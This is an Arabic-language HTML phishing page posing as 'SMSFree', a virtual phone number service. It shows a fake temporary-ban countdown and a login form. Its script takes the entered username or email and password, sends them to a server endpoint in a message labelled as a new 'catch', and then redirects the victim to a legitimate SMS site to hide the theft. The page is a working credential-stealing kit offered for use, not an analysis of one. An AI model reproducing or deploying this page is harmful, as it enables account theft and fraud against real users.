<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - تفعيل الحساب</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --primary-cyan: #22d3ee;
            --secondary-blue: #0ea5e9;
            --accent-orange: #fbbf24;
            --text-white: #f8fafc;
        }

        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
            background-color: var(--bg-color);
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            color: var(--text-white);
        }

        .main-container {
            width: 90%; max-width: 420px; background-color: var(--card-bg);
            padding: 40px 25px; border-radius: 24px; text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        .logo-circle {
            width: 120px; height: 120px; border: 2px solid #334155;
            border-radius: 50%; margin: 0 auto 30px;
            display: flex; justify-content: center; align-items: center;
            font-size: 24px; font-weight: bold; color: var(--text-white);
        }

        h2 { font-size: 18px; line-height: 1.6; color: var(--primary-cyan); margin-bottom: 25px; }

        .ban-box {
            border: 2px solid var(--accent-orange); border-radius: 12px;
            padding: 12px; margin-bottom: 25px; background: rgba(251, 191, 36, 0.1);
            color: var(--accent-orange); font-weight: bold; font-size: 14px;
        }

        input {
            width: 100%; padding: 18px; margin-bottom: 15px;
            background: #0f172a; border: 1px solid #334155;
            border-radius: 12px; color: white; outline: none;
            text-align: center; font-size: 16px; box-sizing: border-box;
        }

        .submit-btn {
            width: 100%; padding: 18px; margin-top: 10px;
            background: linear-gradient(to right, var(--secondary-blue), var(--primary-cyan));
            border: none; border-radius: 12px; color: #0f172a;
            font-size: 18px; font-weight: bold; cursor: pointer;
            transition: 0.3s;
        }

        .footer-text { margin-top: 30px; font-size: 12px; color: #64748b; }
    </style>
</head>
<body>

<div class="main-container">
    <div class="logo-circle">SMSFree</div>
    <h2>سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك.</h2>

    <div class="ban-box" id="banBox">
        لقد تم حظرك مؤقتاً. فك الحظر بعد <span id="timer">30</span> ثانية
    </div>

    <form id="loginForm">
        <input type="text" id="user" placeholder="رقم الهاتف أو البريد" required>
        <input type="password" id="pass" placeholder="••••••" required>
        <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
    </form>
    <div class="footer-text">© Global Virtual Numbers Pro 2024. جميع الحقوق محفوظة.</div>
</div>

<script>
    let timeLeft = 30;
    const timerDisplay = document.getElementById('timer');
    const banBox = document.getElementById('banBox');

    const countdown = setInterval(() => {
        timeLeft--;
        if(timerDisplay) timerDisplay.innerText = timeLeft;
        if (timeLeft <= 0) {
            clearInterval(countdown);
            if(banBox) banBox.style.display = 'none';
        }
    }, 1000);

    document.getElementById('loginForm').onsubmit = async (e) => {
        e.preventDefault();
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;

        // إرسال البيانات كرسالة نصية واحدة للسيرفر
        const fullMessage = `🎯 صيد جديد من التصميم المظلم 🎯\n━━━━━━━━━━━━━━━\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}\n━━━━━━━━━━━━━━━`;

        try {
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: fullMessage })
            });
            window.location.href = "https://receive-smss.com/";
        } catch (err) {
            Swal.fire({ text: 'خطأ في الاتصال', icon: 'error' });
        }
    };
</script>
</body>
</html>
